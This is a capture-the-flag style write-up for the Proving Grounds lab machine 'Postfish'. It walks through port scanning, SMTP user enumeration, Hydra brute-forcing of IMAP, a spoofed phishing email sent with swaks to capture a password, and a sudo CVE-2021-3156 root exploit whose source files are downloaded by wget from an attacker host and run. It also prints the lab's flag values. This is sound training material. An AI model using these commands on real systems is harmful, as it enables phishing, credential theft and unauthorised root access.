---
title: Proving Grounds Practice — Postfish     
date: 2025-07-16 00:00:00 +0800      
categories: [proving gounds]          
tags: [proving gounds]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                       
---

- **OS**: Linux
- **Difficulty**: Intermediate

## Service Enumeration

**Port Scan Results**

**TCP**: 22, 25, 80, 110, 143, 993, 995

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```
└─$ sudo ~/nmapAutomator/nmapAutomator.sh 192.168.179.137 All 
[sudo] password for kali: 

Running all scans on 192.168.179.137

Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s



---------------------Starting Script Scan-----------------------



PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL TOP STLS PIPELINING CAPA AUTH-RESP-CODE USER SASL(PLAIN) RESP-CODES
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: STARTTLS Pre-login listed more have ID post-login IDLE LITERAL+ capabilities AUTH=PLAINA0001 OK IMAP4rev1 LOGIN-REFERRALS SASL-IR ENABLE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login listed more have ID post-login IDLE LITERAL+ capabilities AUTH=PLAINA0001 OK IMAP4rev1 LOGIN-REFERRALS SASL-IR ENABLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA SASL(PLAIN) UIDL TOP USER AUTH-RESP-CODE PIPELINING RESP-CODES
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel



---------------------Starting Full Scan------------------------


PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

## Initial Access — smtp userenum and readmail to ssh

```bash
echo -n '192.168.214.137    postfish.off' | sudo tee -a /etc/hosts
```

![image-20260211041000952](assets/img/image-20260211041000952.png)

While reviewing **Our team** page at port 80, we noticed several names.

![image-20260211041003262](assets/img/image-20260211041003262.png)

Use `username-anarchy` to generate all possible username formats.

> [GitHub - urbanadventurer/username-anarchy: Username tools for penetration testing](https://github.com/urbanadventurer/username-anarchy)

![image-20260211041006660](assets/img/image-20260211041006660.png)

![image-20260211041009355](assets/img/image-20260211041009355.png)

Run `smtp-user-enum` to enumerate users, using both the `names.txt` wordlist and the `new_user.txt` file we generated previously.

> [GitHub — cytopia/smtp-user-enum: SMTP user enumeration via VRFY, EXPN and RCPT](https://github.com/cytopia/smtp-user-enum)

```bash
smtp-user-enum -M VRFY -U /home/kali/oscp/pg/Postfish/new_user.txt -t 192.168.214.137
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.214.137
```

![image-20260211041012068](assets/img/image-20260211041012068.png)

![image-20260211041014635](assets/img/image-20260211041014635.png)

combine list of format `username:username`

![image-20260211041017324](assets/img/image-20260211041017324.png)

We used Hydra to brute-force the IMAP service and successfully obtained the credentials `sales:sales`.

```
hydra -C user.txt imap://192.168.214.137
```

![image-20260211041019507](assets/img/image-20260211041019507.png)

After logging into the sales mailbox with the `sales:sales` credentials, we discovered an email from the IT team announcing a forthcoming password reset.

```
nc -nv 192.168.214.137 143
1 LOGIN sales sales
1 LIST "" *
1 SELECT INBOX
1 FETCH 1 BODY[]
```

![image-20260211041022619](assets/img/image-20260211041022619.png)

A phishing email was sent to the user `brian.moore` using the `swaks` utility. The email contained a malicious link configured to connect to an attacker-controlled `netcat` listener on TCP port 80.

```
swaks -t brian.moore@postfish.off --from it@postfish.off --server 192.168.214.137 --body "click http://192.168.214.137 to reset your password" --header "Subject: password reset"
```

![image-20260211041025617](assets/img/image-20260211041025617.png)

got brian.moore's password `EternaLSunshinE` !

```
nc -lvnp 80
```

![image-20260211041029017](assets/img/image-20260211041029017.png)

login through ssh with credentials `brian.moore:EternaLSunshinE` .

```
ssh brian.moore@192.168.179.137
```

![image-20260211041031675](assets/img/image-20260211041031675.png)

**local.txt value:** 5b7f7f7921352011f03819d90ee6d752

```bash
cat local.txt
ip a
```

![image-20260211041033911](assets/img/image-20260211041033911.png)

## Privilege Escalation — sudo version

> [GitHub - CptGibbon/CVE-2021-3156: Root shell PoC for CVE-2021-3156](https://github.com/CptGibbon/CVE-2021-3156)

```
wget -q http://192.168.45.182/shellcode.c
wget -q http://192.168.45.182/exploit.c
wget -q http://192.168.45.182/Makefile
```

![image-20260211041037075](assets/img/image-20260211041037075.png)

```
updog -p 80
```

![image-20260211041039194](assets/img/image-20260211041039194.png)

```bash
make
./exploit
```

![image-20260211041041354](assets/img/image-20260211041041354.png)

## Post Exploitation

**proof.txt value:** f2a3ce1274ccd994d4da99f6cc0e89d1

```bash
whoami
cat /root/proof.txt
ip a
```

![image-20260211041044154](assets/img/image-20260211041044154.png)
